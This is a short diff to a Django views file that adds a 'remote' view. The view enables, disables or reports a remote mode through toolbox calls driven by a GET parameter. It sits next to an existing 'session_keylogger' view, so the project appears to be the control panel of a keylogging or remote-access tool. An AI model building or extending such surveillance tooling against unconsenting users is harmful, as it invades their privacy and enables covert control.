@@ -211,6 +211,17 @@ def session_keylogger(request, id):
 	return render(request, 'server/session_keylogger.html', {'id': int(id), 'enabled': enabled})
 
 
+def remote(request):
+	if request.GET.get('action') == 'enable':
+		toolbox.enable_remote()
+	elif request.GET.get('action') == 'disable':
+		toolbox.disable_remote()
+	elif request.GET.get('action') == 'state':
+		return render(request, 'server/remote_state.html', {'enabled': toolbox.get_remote_state()})
+
+	return render(request, 'server/remote.html', {'enabled': toolbox.get_remote_state()})
+
+
 # Template filters
 from django.template.defaulttags import register
 
